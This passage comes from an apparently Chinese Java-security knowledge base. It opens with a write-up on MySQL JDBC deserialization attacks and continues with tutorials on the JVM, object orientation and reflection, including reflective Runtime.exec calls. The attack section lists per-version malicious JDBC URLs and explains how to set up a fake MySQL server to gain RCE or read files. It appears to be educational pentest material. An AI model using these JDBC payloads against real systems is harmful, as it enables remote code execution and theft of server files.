payload使用ServerStatusDiffInterceptor触发 String driver = \"com.mysql.jdbc.Driver\"; String user = \"Jdk8u181\"; String password = \"xxxx\"; String DB_URL = \"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\"; Class.forName(driver); Connection conn = (Connection) DriverManager.getConnection(DB_URL,user,password); 使用detectCustomCollations触发 String driver = \"com.mysql.jdbc.Driver\"; String user = \"Jdk8u181\"; String password = \"xxxx\"; String DB_URL = \"jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true\"; Class.forName(driver); Connection conn = (Connection) DriverManager.getConnection(DB_URL,user,password); 5.1.28 针对5.1.28 payload使用ServerStatusDiffInterceptor触发 String driver = \"com.mysql.jdbc.Driver\"; String user = \"Jdk8u181\"; String password = \"xxxx\"; String DB_URL = \"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\"; Class.forName(driver); Connection conn = (Connection) DriverManager.getConnection(DB_URL,user,password); 针对5.1.28 payload使用detectCustomCollations触发 String driver = \"com.mysql.jdbc.Driver\"; String user = \"abc\"; String password = \"xxxx\"; String DB_URL = \"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true\"; Class.forName(driver); Connection conn = (Connection) DriverManager.getConnection(DB_URL,user,password); 速通 ServerStatusDiffInterceptor触发 8.x: jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor 6.x(属性名不同): jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor 5.1.11及以上的5.x版本（包名没有了cj）:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor 5.1.10及以下的5.1.X版本： 同上，但是需要连接后执行查询。 5.0.x: 还没有ServerStatusDiffInterceptor这个东西 detectCustomCollations触发 5.1.41及以上: 不可用 5.1.29-5.1.40: jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true 5.1.28-5.1.19： jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true 5.1.18以下的5.1.x版本： 不可用 5.0.x版本不可用 踩坑指南 MySQL_Fake_Server缺省修改config.json之后需要及时重启服务，只有每次启动才能重新读取config.json 如果不用缺省的config.json中的yso,需要针对user进行改变，而不是作者提供的yso_JRE8u20_calc,从代码中可以看到通过对username以_进行分割，username中需要携带yso_type(payload)，yso_command(执行命令)，应该是yso_CommonsCollections5_open -a Calculator.app,使用yso_开头的用户名需要针对config.json将yso的字典删除 分析 这里以8.0.12来分析 触发queryInterceptors则需要触发SQL Query，而在getConnection过程中，会触发SET NAMES utf、set autocommit=1一类的请求，所以会触发我们所配置的queryInterceptors 当Fake Server收到了SHOW SESSION STATUS的指令 则会向JDBC发送反序列化数据 mappedValues保存从FakeServer中发送来的数据，只要保证第1或第2字段为BLOB且存存储了我们的序列化数据，即可触发 当MySQL字段类型为BLOB时，会对数据进行反序列化，确定字段为BLOB类型除了协议报文中列字段类型为BLOB以外，还需要FLAGS大于128、来源表不为空，否则会被当做Text 用途 FakeMysqlServer可以用作蜜罐获取客户端数据 在渗透测试中，如果有管理后端可以配置mysql连接，可以尝试将服务端任意文件读取出来 在Java的管理后台中，配置JDBC连接数据库URL可控且存在相应的CC组建，即可直接RCE 参考链接 https://lightless.me/archives/read-mysql-client-file.html https://github.com/fnmsd/MySQL_Fake_Server https://www.anquanke.com/post/id/203086 https://xz.aliyun.com/t/10599 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-09-07 14:46:13 "},"知识库/02.JAVA安全/01.Java JVM内存模型/":{"url":"知识库/02.JAVA安全/01.Java JVM内存模型/","title":"01.Java JVM内存模型","keywords":"","body":"JVM JVM 内存划分：它是人为的根据不同的内存空间的存储特点以及存储数据（逻辑划分） 程序计数器：当前线程所执行的字节码的行号指示器 本地方法栈：为虚拟机使用native方法服务 Java虚拟机栈：描述Java方法执行的内存模型，每个方法被执行的时候都会同时创建一个栈帧用于存储该方法的局部变量表、操作栈、动态链接、方法出口等信息（每一个方法创建一个栈帧，栈帧存放了当前方法的数据信息（局部变量），当方法调用完毕，该方法的栈帧就被销毁了） Java 堆：被所有线程共享的一块内存区域，在虚拟机启动时被创建。所有的对象实例以及数组都要在堆上分配（当使用new 关键字，就表示在堆中开辟一块新的存储空间） 方法区：线程共享的内存区域，存储已被虚拟机加载的类信息，常量、静态变量即时编译器编译后的代码数据等（这个区域的内存回收目标主要是针对常量的回收和对类型 的卸载) GC（Garbage Collection）垃圾回收器 Java的自动垃圾回收机制，简单理解为，程序员就不需要再手动的去控制内存的释放，当JVM发觉内存资源紧张的时候，就会自动地去清理无用对象（没有被引用的对象） Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:28:17 "},"知识库/02.JAVA安全/02.Java 面向对象/":{"url":"知识库/02.JAVA安全/02.Java 面向对象/","title":"02.Java 面向对象","keywords":"","body":"简介 面向过程 该思想是站在过程的角度思考问题，强调的是功能行为，功能的执行过程，先干什么，后干什么，而每一个功能，都是用函数（类似于方法）把这些步骤一步一步实现，使用的时候依次调用函数 面向过程的设计 最小的程序单元就是函数，每个函数负责完成某一个功能，用于接收输入数据，函数堆输入数据进行处理，然后输出结果数据 整个软件系统由一个个的函数组成，其中作为程序入口的函数称之为主函数，主函数依次调用其他函数，普通函数之间可以相互调用，从而实现整个系统功能 面向过程的设计缺陷 面向过程的设计，是采用了置顶而下的设计方式，再设计阶段就需要考虑每一个模块应该分解成哪些子模块，每个子模块有细分更小的子模块，如此类推，知道将模块细化成一个个函数 存在的问题： 设计不够直观，与人类思维习惯不一致（谁来吃饭，而不是吃饭谁来参与） 系统软件适应性差，可拓展性差，维护性低 面向过程最大的问题在于随着系统的膨胀，面向过程将无法应付，最终导致系统的崩溃。为了解决这一种软件危机，提出了面向对象的思想 面向对象 一种基于面向过程的新的编程思想，顾名思义该思想是站在对象的角度思考问题，我们把多个功能合理放到不同对象里，强调的是具备某些功能的对象，而具备某种功能的实体，称之为对象。 面向对象的最小程序单元是：类 面向对象的优势与特点 更加符合我们常规的思维方式，稳定性好，可重用性强，易于开发大型软件产品，有良好的可维护性，在软件工程中，面向对象可以使工程更加模块化，实现更低的耦合和更高的内聚，面向对象的三大特征如下： 封装 继承 多态 封装：指将对象的实现细节隐藏起来，然后通过公共的方法向外暴露该对象的功能 继承：面向对象实现软件复用的重要手段，当子类继承父类后，子类是一种特殊的父类，能直接或间接获得父类里的成员 多态：可以直接把子类对象赋值给父类变量，但是运行时依然表现出子类的行为特征，这意味着同一类型的对象在运行时可能表现出不同的行为特征 类和对象 面向对象的三大特征 封装 继承 多态 理解什么是抽象 从特定的角度出发，从已经存在的一些事物中抽取我们所关注的特性、行为、从而形成一个新的十五的思维过程，是一种复杂到简单的思维方式 对象和类的关系 对象可以定义为包含状态和行为的一个实体，对象（object）也称为实例（Instance） 实体：存在于现实世界中并且可以与其他物体区分开的物体，表示实际存在的个体 对象 人们要进行研究的任何事物，一切事物都可以认为是对象 对象具有状态和行为 状态：比如姓名，年龄，性别等 行为：比如吃饭，睡觉，写代码等 通过多个同类型的对象分析，我们可以把对象抽象成类 类 具有相同特性（状态）和行为（功能）的对象抽象就是类。因此，对象的抽象是类，类的具体化就是对象，也可以说类的实例就是对象，类实际上就是一种数据类型 特性：对象的状态，用成员变量来描述 功能：对象的行为，用方法来描述 类是对象的类型/模板；创建一个对象就是使用一个类作为构建该对象的基础，实际上解释类和对象的关系确实存在着“先有蛋还是先有鸡”的问题，描述类扫不了对象，相反，描述对象也少不了类。对象是类的实例，类是对象的模板 如何定义一个类 [修饰符] class 类名{ 0 ~ N 个成员变量(字段/Field) 不要叫属性(JavaBean 中特殊的一种成员); 0 ~ N 个方法 } 定义类的注意事项： 如果类使用了public修饰符，必须保证当前文件名和当前类名相同 类名使用名称表示，类表示某一类事物，首字母大写，如果是多个的单词组成使用驼峰表示法，如EmployeeAdvanceSetting 在面向对象的过程中，定义类的时候，专门为描述对象提供一个类，该类不需要main方法对象的创建和条用方法以及操作字段 ``` 根据类来创建对象的语法 a. 类名 变量 = new 类名(); 给字段设置值 a. 对象变量.字段名称 = 该类型的值; 获取对象的值 a. 该字段类型对象变量 变量 = 对象变量.字段值 通过对象调用方法 a. 对象变量.方法(实参) java // Person 类 package com.study.Object; public class Person { public String userName; public int age; public int weight; public void sign() { System.out.println(this.userName + \" is sign~\"); } public void dance() { System.out.println(this.userName + \" is dance~\"); } } ```java // main 函数 package com.study.Object; public class Main { public static void main(String[] args) { Person aaron = new Person(); Person joe = new Person(); aaron.userName = \"aaron\"; aaron.age = 24; joe.userName = \"joe\"; joe.age = 23; System.out.println(aaron.userName); System.out.println(joe.age); } } aaron 23 对象实例化的过程 方法区是存放加载的类信息，方法信息的地址，程序要运行，首先要将Main.class（包含方法等）放置在方法区，然后再将Person.class字节码存入到方法区内 栈里存放了方法运行（main方法）时的局部变量，aaron，joe都是对象变量 堆：当使用new 关键字，就表示在堆中开辟一块新的存储空间 对象的引用地址就是在new的时候在堆里创建的一个地址，这种关系被称为引用关系，当我们操作aaron对象的时候，实际上是操作的0x1234这个地址的数据 对象的打印、比较、生命周期 打印 打印对象的时候，打印出来的效果如下：类的名称@十六进制的hashcode 如果想知道对象里的成员变量信息，就需要Object.toString()方法 // Main package com.study.Object; public class Main { public static void main(String[] args) { Person aaron = new Person(); Person joe = new Person(); System.out.println(aaron); System.out.println(joe); } } com.study.Object.Person@1540e19d com.study.Object.Person@677327b6 比较 == : 对于基本数据类型来说，比较的是值，对于引用类型来说，比较的是在内存中地址的值，每次使用new关键字，都表示在堆值新开辟一块内存空间，不同的内存空间地址值不同 如果对象拥有完全相同的数据，是否能俩对象相等？可以使用Object.equals()方法 package com.study.Object; public class Main { public static void main(String[] args) { Person aaron = new Person(); Person joe = new Person(); System.out.println(aaron == joe); } } false 生命周期 对象什么时候出生：每次使用new 关键字的时候，就会在堆内存中开辟新的空间，此时对象开始存在 对象什么时候结束：当堆中的对象没有被任何变量所引用，此时该对象就成了垃圾，就等着垃圾回收器（GC）来回收该垃圾，当被回收后，对象就被销毁了 回收垃圾的目的是为了释放更多的内存 匿名对象：匿名/佚名 没有名称的对象，也就是在堆中开辟一块新的内存空间，但是没有把该空间地址赋给任何变量，如下所示 new Person(); 因为没有名称，匿名对象仅仅只能使用一次，用完一次之后，就等着GC来回收，一般的把匿名对象作为方法的实参传递 构造器 // 这个代码调用一个方法名为Person() 的无参数方法 // 这个方法就是构造方法(Constructor) Person person = new Person(); 我们在Person类中，没有找到该构造方法，却又没有报错，但是在反编译之后，是存在该构造方法 package com.study.Object; public class Person { public String userName; public int age; public int weight; public void sign() { System.out.println(this.userName + \" is sign~\"); } public void dance() { System.out.println(this.userName + \" is dance~\"); } } 当我们在编译的时候，编译器会创建该默认(缺省)构造函数 构造器的作用 创建对象，但是必须要和new一起使用 完成对象的初始化操作 构造器的特点 构造器的名称和当前所在类的名称相同 禁止定义返回类型，千万不要使用void作为返回类型，void Person(){}这就是个普通方法 在构造器中不需要使用return，返回的是当前创建对象的引用 编译器创建的默认构造器特点 符合构造函数特点 无参数 无方法体 如果类没有使用public修饰，则编译器创建的构造器也没有public修饰自定义构造器与构造器重载 如果没有显示提供构造器，则编译器在编译过程中会创建一个缺省构造器，但是如果显式定义了一个构造器，编译器在编译过程中则不会再创建缺省构造器自定义构造器 ```java // Person.java package com.study.Object; public class Person { public String userName; public int age; public int weight; public Person(){ System.out.println(\"我被调用了\"); } } ```java // Main.java package com.study.Object; public class Main { public static void main(String[] args) { Person person = new Person(); } } 我被调用了 说明创建对象其实是在调用构造器 构造器重载 方法的重载（Overload）避免在同一个类中，相同功能的方法名字不同 判断：两同一不同：同一个类，同一个方法名称，参数不同 构造器的的重载 构造器是一种特殊的方法，也可以存在重载 // Person.java package com.study.Object; public class Person { public String userName; public int age; public int weight; public Person(){ System.out.println(\"我被调用了\"); } public Person(String userName){ System.out.println(\"我被调用了username\"); } } // Main.java package com.study.Object; public class Main { public static void main(String[] args) { Person person = new Person(); Person Person1 = new Person(\"aaron\"); } } 我被调用了 我被调用了username static 修饰符 状态和行为应该有对象和类型之分 有的状态和行为应该属于对象，不同的对象状态和行为可以不一样 有的状态和行为应该属于类型，不属于对象 static 的真正作用，用来区别字段，方法，内部类，初始化代码块 static 修饰符的特点： static 修饰符修饰的成员(字段/方法)，随着所在类的加载而加载，当JVM把字节码加载进JVM的时候，static修饰的成员已经在内存中存在了 优先于对象的存在，对象是手动通过new关键字创建出来的 static 修饰符修饰的成员被该类型的所有对象共享，根据该类创建出来的任何对象，都可以访问static成员，表面上通过对象去访问static 修饰的成员，其本质依然使用类型访问，和对象没有任何关系 直接使用类名访问static成员，因为static修饰的成员直接属于类，不属于对象，可以直接使用类名访问static成员 ```java // Person.java package com.study.Object; public class Person { String name = \"\"; int age = 0; static int totalNum = 5; public Person(String name, int age) { name = name; age = age; totalNum++; } void die() { totalNum--; System.out.println(\"die\"); } static void destory() { totalNum = 0; System.out.println(\"destory\"); } } ```java package com.study.Object; public class Main { public static void main(String[] args) { System.out.println(Person.totalNum); Person person = new Person(\"aaron\",24); System.out.println(Person.totalNum); } } 5 6 static 成员在JVM中的存储 字节码加载进虚拟机，static成员就已经在方法区了 类成员与实例成员 类中的成员：字段、方法，内部类 类成员：使用static修饰的成员 实例成员：没有static 修饰的成员 类成员只能访问类成员，实例成员只能访问实例成员 类成员直接属于类，可以通过类访问static字段和static 方法 实例成员，只属于对象，通过对象来访问非static字段和非static 方法 在static 方法，只能调用static 成员 非static 方法，可以访问静态成员，也可以访问实例成员 什么时候定义成static 的字段和方法 如果这一个状态/行为属于整个事物（类）就直接使用static修饰i，被所有对象使用，一般在开发中，往往把工具方法使用static 修饰，如果不适用static修饰，则这些方法属于该类的对象，就得需要创建对象再调用方法，开发工具对象只需要一份即可，可能创建N个对象，此时往往把类设计为单例 弊端：生命周期长 未完待续。。。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 20:28:52 "},"知识库/02.JAVA安全/03.Java反射机制/":{"url":"知识库/02.JAVA安全/03.Java反射机制/","title":"03.Java反射机制","keywords":"","body":"反射 何为反射 反射就是Reflection，Java的反射是指程序在运行期可以拿到一个对象的所有信息。即Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。 class（包括interface）的本质是数据类型（Type） 而**class**是由JVM在执行过程中动态加载的。JVM在第一次读取到一种**class**类型时，将其加载进内存。 每加载一种class，JVM就为其创建一个Class类型的实例，并关联起来。注意：这里的Class类型是一个名叫Class的class。它长这样： public final class Class { private Class() {} } 以String类为例，当JVM加载String类时，它首先读取String.class文件到内存，然后，为String类创建一个Class实例并关联起来： Class cls = new Class(String); 这个Class实例是JVM内部创建的，如果我们查看JDK源码，可以发现Class类的构造方法是private，只有JVM能创建Class实例，我们自己的Java程序是无法创建Class实例的。 所以，JVM持有的每个Class实例都指向一个数据类型（class或interface） 由于JVM为每个加载的**class**创建了对应的**Class**实例，并在实例中保存了该**class**的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个**Class**实例，我们就可以通过这个**Class**实例获取到该实例对应的**class**的所有信息。 这种通过**Class**实例获取**class**信息的方法称为反射（Reflection）。 获取class的Class实例 获取一个class的Class实例，有4个方法： 方法一 直接通过一个class的静态变量class获取： Class cls = String.class; 方法二 如果我们有一个实例变量，可以通过该实例变量提供的getClass()方法获取： String s = \"Hello\"; Class cls = s.getClass(); 方法三 如果知道一个class的完整类名，可以通过静态方法Class.forName()获取： Class cls = Class.forName(\"java.lang.String\"); 方法四 利用classLoader Class cls = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\") 比较 因为Class实例在JVM中是唯一的，所以，上述方法获取的Class实例是同一个实例。可以用==比较两个Class实例： Class cls1 = String.class; String s = \"Hello\"; Class cls2 = s.getClass(); boolean sameClass = cls1 == cls2; // true 获取基本信息 获取class的基本信息 package org.example; import java.util.ArrayList; public class App{ public static void main(String[] args) { Class cls1 = String.class; ArrayList a = new ArrayList(); Class cls2 = a.getClass(); printInfo(cls1); printInfo(cls2); } static void printInfo(Class cls){ System.out.println(\"Class name : \" + cls.getName()); System.out.println(\"Simple name: \" + cls.getSimpleName()); if (cls.getPackage() != null) { System.out.println(\"Package name: \" + cls.getPackage().getName()); } System.out.println(\"is interface: \" + cls.isInterface()); System.out.println(\"is enum: \" + cls.isEnum()); System.out.println(\"is array: \" + cls.isArray()); System.out.println(\"is primitive: \" + cls.isPrimitive()); } } 小结 JVM为每个加载的class及interface创建了对应的Class实例来保存class及interface的所有信息； 获取一个class对应的Class实例后，就可以获取该class的所有信息； 通过Class实例获取class信息的方法称为反射（Reflection）； JVM总是动态加载class，可以在运行期根据条件来控制加载class。 访问字段 对任意的一个Object实例，只要我们获取了它的Class，就可以获取它的一切信息。 我们先看看如何通过Class实例获取字段信息。 获取字段的一些信息 import java.util.Arrays; public class Test{ public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { Class ot = OtherTest.class; System.out.println(Arrays.toString(ot.getFields())); // 获取所有public的field（包括父类） System.out.println(Arrays.toString(ot.getDeclaredFields())); // 获取当前类的所有field（不包括父类） System.out.println(ot.getField(\"a\")); // 根据字段名获取某个 public 的field（包括父类） System.out.println(ot.getDeclaredField(\"b\")); // 根据字段名获取当前类的某个field（不包括父类） System.out.println(ot.getField(\"a\").getName()); // 字段名称 System.out.println(ot.getField(\"a\").getType()); // 字段类型，也是一个Class实例 System.out.println(ot.getField(\"a\").getModifiers()); // 修饰符 } } class OtherTest extends emmTest{ public int a = 5; private int b; } class emmTest { public float cc; } [public int OtherTest.a, public float emmTest.cc] [public int OtherTest.a, private int OtherTest.b] public int OtherTest.a private int OtherTest.b a int 1 获取字段的值 先获取Class实例，再获取Field实例，然后，用Field.get(Object)获取指定实例的指定字段的值。 package org.example; import java.lang.reflect.Field; public class App { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field f = cls.getDeclaredField(\"name\"); f.setAccessible(true); // 设置访问权限，一律为true，不然不能访问 private 的 Object value = f.get(ot); // 从对象ot中获取值，因为所有的同类型class共用一个Class，所以获取内容要选定对象 System.out.println(value); } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } } // 输出 haha 反射是一种非常规的用法，使用反射，首先代码非常繁琐，其次，它更多地是给工具或者底层框架来使用，目的是在不知道目标实例任何信息的情况下，获取特定字段的值。 此外，setAccessible(true)可能会失败。如果JVM运行期存在SecurityManager，那么它会根据规则进行检查，有可能阻止setAccessible(true)。例如，某个SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，这样可以保证JVM核心库的安全。 获取所有的字段 public class APP { public static void main(String[] args) throws IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field[] f = cls.getDeclaredFields(); //取所有的字段 for (Field field : f) { field.setAccessible(true);// 设置访问权限，一律为true，不然不能访问 private 的 System.out.println(field.getName() + \" \" + field.getType()); // 获取field 的Name，Type System.out.println(field.get(ot)); } } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } } // 输出 // name class java.lang.String // haha 修改字段的值 package org.example; import java.lang.reflect.Field; public class App { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field f = cls.getDeclaredField(\"name\"); f.setAccessible(true); // 设置访问权限，一律为true，不然不能访问 private 的 f.set(ot, \"modify\"); // 反射修改值 System.out.println(ot.getName()); } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } public String getName() { return name; } } 小结 Java的反射API提供的Field类封装了字段的所有信息： 通过Class实例的方法可以获取Field实例：getField()，getFields()，getDeclaredField()，getDeclaredFields()； 通过Field实例可以获取字段信息：getName()，getType()，getModifiers()； 通过Field实例可以读取或设置某个对象的字段，如果存在访问限制，要首先调用setAccessible(true)来访问非public字段。 通过反射读写字段是一种非常规方法，它会破坏对象的封装。 调用方法（‼️） 获取方法 通过Class实例获取所有Method信息。Class类提供了以下几个方法来获取Method import java.util.Arrays; public class Test{ public static void main(String[] args) throws NoSuchMethodException { Class cls = OtherTest.class; // Class cls = ot.getClass(); System.out.println(Arrays.toString(cls.getMethods())); // 获取所有public的Method（包括父类） System.out.println(Arrays.toString(cls.getDeclaredMethods())); // 获取当前类的所有Method（不包括父类） System.out.println(cls.getMethod(\"echoEver\", String.class)); // 获取某个public的Method（包括父类） //.getMethod(方法名，这个方法的参数类型) System.out.println(cls.getDeclaredMethod(\"echoEver\", String.class)); // 获取当前类的某个Method（不包括父类） } } class OtherTest{ public void echoEver(String thing){ System.out.println(thing); } } // ===== /* [public void org.example.OtherTest.echoEver(java.lang.String), public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException, public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException, public final void java.lang.Object.wait() throws java.lang.InterruptedException, public boolean java.lang.Object.equals(java.lang.Object), public java.lang.String java.lang.Object.toString(), public native int java.lang.Object.hashCode(), public final native java.lang.Class java.lang.Object.getClass(), public final native void java.lang.Object.notify(), public final native void java.lang.Object.notifyAll()] [public void org.example.OtherTest.echoEver(java.lang.String)] public void org.example.OtherTest.echoEver(java.lang.String) public void org.example.OtherTest.echoEver(java.lang.String) */ 调用方法 获取Class实例 反射获取方法 invoke调用方法 package org.example; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class App { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { OtherTest ot = new OtherTest(); Class cls = ot.getClass(); Method echoEver = cls.getDeclaredMethod(\"echoEver\", String.class); echoEver.setAccessible(true); echoEver.invoke(ot,\"test\"); // 第一个参数是调用该方法的对象，第二个参数是一个可变长参数，是这个方法的需要传入的参数 } } class OtherTest{ private void echoEver(String thing){ System.out.println(thing); } } 示例 这里再以Java中使用反射调取Runtime来执行命令注入 // 传统使用Java 来执行Runtime进行命令执行代码 package org.example; import java.io.*; public class App { public static void main(String[] args) throws IOException{ Process s = Runtime.getRuntime().exec(\"whoami\"); InputStream inputStream = s.getInputStream(); InputStreamReader inputStreamReader = new InputStreamReader(inputStream); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String line; while ((line = bufferedReader.readLine()) != null) { System.out.println(line); } } } 使用反射 package com.ReflectTest; import java.io.*; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Reflect { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException { Class clazz = Class.forName(\"java.lang.Runtime\"); Method method = clazz.getDeclaredMethod(\"exec\", String.class); Process process = (Process) method.invoke(Class.forName(\"java.lang.Runtime\").getDeclaredMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")), \"whoami\"); // 这里细看Class.forName(\"java.lang.Runtime\").getDeclaredMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")) // 在这里，method.invoke 第一个参数是实例化的对象，从不使用反射的代码中看，应该是Runtime.getRuntime() 这个实例化对象 // 然后要调用 getRuntime()的实例化对象则是Runtime，所以整合起来如下： // Class.forName(\"java.lang.Runtime\").getDeclaredMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")) // 这个就是上述调用exec方法的实例化对象RunTime.getRuntime() // 反射调用方法，就是从后往前依次寻找调用方法的实例化对象，加上参数 InputStream inputStream = process.getInputStream(); InputStreamReader inputStreamReader = new InputStreamReader(inputStream); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String line; while ((line = bufferedReader.readLine()) != null) { System.out.println(line); } } } class OtherTest { private void echoEver(String thing) { System.out.println(thing); } } 小结 Java的反射API提供的Method对象封装了方法的所有信息： 通过Class实例的方法可以获取Method实例：getMethod()，getMethods()，getDeclaredMethod()，getDeclaredMethods()； 通过Method实例可以获取方法信息：getName()，getReturnType()，getParameterTypes()，getModifiers()； 通过Method实例可以调用某个对象的方法：Object invoke(Object instance, Object... parameters)； 通过设置setAccessible(true)来访问非public方法； 通过反射调用方法时，仍然遵循多态原则。 调用构造方法 举例 我们通常使用new操作符创建新的实例： Person p = new Person(); 如果通过反射来创建新的实例，可以调用Class提供的newInstance()方法： Person p = Person.class.newInstance(); 调用**Class.newInstance()**的局限是，它只能调用该类的public无参数构造方法。如果构造方法带有参数，或者不是public，就无法直接通过**Class.newInstance()**来调用。 为了调用任意的构造方法，Java的反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。Constructor对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例： package org.example; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; public class App { public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class cls = Integer.class; System.out.println(cls.getName()); System.out.println(Arrays.toString(cls.getConstructors())); // Integer.class.getConstructor(int.class); Constructor cons1 = cls.getConstructor(int.class); Integer int1 = cons1.newInstance(123); System.out.println(int1); Constructor cons2 = cls.getConstructor(String.class); System.out.println(cons2.newInstance(\"456\")); } } /* java.lang.Integer [public java.lang.Integer(int), public java.lang.Integer(java.lang.String) throws java.lang.NumberFormatException] 123 456 */ 通过Class实例获取Constructor的方法如下： getConstructor(Class...)：获取某个public的Constructor； getDeclaredConstructor(Class...)：获取某个Constructor； getConstructors()：获取所有public的Constructor； getDeclaredConstructors()：获取所有Constructor。 注意Constructor总是当前类定义的构造方法，和父类无关，因此不存在多态的问题。 调用非public的Constructor时，必须首先通过setAccessible(true)设置允许访问。setAccessible(true)可能会失败。 示例 调用方法示例使用invoke方法反射调用Runtime.getRuntime.exec(String.class)方法，那么由Construct改写如下： package com.ReflectTest; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Class clazz = Class.forName(\"java.lang.Runtime\"); Method method = clazz.getDeclaredMethod(\"exec\", String.class); Constructor constructor = clazz.getDeclaredConstructor(); constructor.setAccessible(true); // 实例化 Runtime runtime = (Runtime) constructor.newInstance(); // 使用exec调用 Process process = (Process) method.invoke(runtime.getRuntime(), \"whoami\"); InputStream inputStream = process.getInputStream(); InputStreamReader inputStreamReader = new InputStreamReader(inputStream); BufferedReader bufferedReader = new BufferedReader(inputStreamReader); String line; while ((line = bufferedReader.readLine()) != null) { System.out.println(line); } } } 小结 Constructor对象封装了构造方法的所有信息； 通过Class实例的方法可以获取Constructor实例：getConstructor()，getConstructors()，getDeclaredConstructor()，getDeclaredConstructors()； 通过Constructor实例可以创建一个实例对象：newInstance(Object... parameters)； 通过设置setAccessible(true)来访问非public构造方法。 获取继承关系 获取父类class和interface import java.util.Arrays; public class Test{ public static void main(String[] args) { OtherTest ot = new OtherTest(\"emm\"); Class cls = ot.getClass(); System.out.println(cls.getSuperclass()); // 获取父类class System.out.println(Arrays.toString(cls.getInterfaces())); // 获取接口 System.out.println(\"\".getClass().getSuperclass()); // 获取 String 的父类 } } class OtherTest extends Emmm implements Aaa{ private String name; public OtherTest(String name){ this.name = name; } @Override public void echo() { System.out.println(\"666\"); } } class Emmm { private int aa; } interface Aaa{ public void echo(); } /* class org.example.Emmm [interface org.example.Aaa] class java.lang.Object */ 小结 通过Class对象可以获取继承关系： Class getSuperclass()：获取父类类型； Class[] getInterfaces()：获取当前类实现的所有接口。 通过Class对象的isAssignableFrom()方法可以判断一个向上转型是否可以实现。 动态代理 有没有可能不编写实现类，直接在运行期创建某个**interface**的实例呢？ 这是可能的，因为Java标准库提供了一种动态代理（Dynamic Proxy）的机制：可以在运行期动态创建某个interface的实例。 所谓动态代理，是和静态相对应的。我们来看静态代码怎么写： // 创建接口 public interface Hello { void morning(String name); } // 实现接口Hello public class HelloWorld implements Hello { public void morning(String name) { System.out.println(\"Good morning, \" + name); } } // 创建实例，调用 public static void main(String[] args) { Hello hello = new HelloWorld(); hello.morning(\"Bob\"); } 动态如下 过程 ，不需要单独实现接口，而是动态实现接口。 过程 在运行期动态创建一个interface实例的方法如下： 定义一个InvocationHandler实例，它负责实现接口的方法调用； 通过Proxy.newProxyInstance()创建interface实例，它需要3个参数： 使用的ClassLoader，通常就是接口类的ClassLoader； 需要实现的接口数组，至少需要传入一个接口进去； 用来处理接口方法调用的InvocationHandler实例。 将返回的Object强制转型为接口。 package org.example; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class App{ public static void main(String[] args) { InvocationHandler handler = new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method); System.out.println(args.length); // 实现对应的方法 if (method.getName().equals(\"echo\")){ System.out.println(args[0]); } return null; } }; Hello hello = (Hello) Proxy.newProxyInstance(Hello.class.getClassLoader(), new Class[]{Hello.class}, handler); hello.echo(\"9999\"); } } interface Hello{ public void echo(String s); } /* 1 9999 */ 小结 Java标准库提供了动态代理功能，允许在运行期动态创建一个接口的实例； 动态代理是通过Proxy创建代理对象，然后将接口方法“代理”给InvocationHandler完成的。 Copyright © aaron 2023 all right reserved，powered 